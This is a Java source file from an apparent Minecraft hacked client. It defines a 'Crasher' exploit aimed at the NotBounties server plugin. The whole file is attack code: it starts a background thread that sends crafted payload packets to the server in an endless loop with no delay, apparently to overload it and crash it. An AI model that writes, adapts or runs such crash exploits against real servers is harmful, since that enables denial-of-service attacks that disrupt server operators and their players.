package io.github.spigotrce.paradiseclientfabric.exploit.impl;

import io.github.spigotrce.paradiseclientfabric.Helper;
import io.github.spigotrce.paradiseclientfabric.exploit.Exploit;
import io.github.spigotrce.paradiseclientfabric.packet.NotBountiesPayloadPacket;
import net.minecraft.client.MinecraftClient;

public class NotBountiesExploit extends Exploit {
    public NotBountiesExploit(MinecraftClient client) {
        super("notbounties", "Crasher", client);
    }

    @Override
    public void execute() {
        Helper.printChatMessage("Executing NotBounties exploit!");
        new Thread(() -> {
            Helper.printChatMessage("Preparing payload!");
            NotBountiesPayloadPacket packet = new NotBountiesPayloadPacket();
            Helper.printChatMessage("Payload prepared!");
            Helper.printChatMessage("Sending payload packets!");
            while (true) {
                Helper.sendPayload(new NotBountiesPayloadPacket());

                try {
                    Thread.sleep(0);
                } catch (InterruptedException e) {
                    Helper.printChatMessage("[CrashExploit] [NotBounties] Unable to sleep 50ms");
                }
            }
        }).start();
    }
}
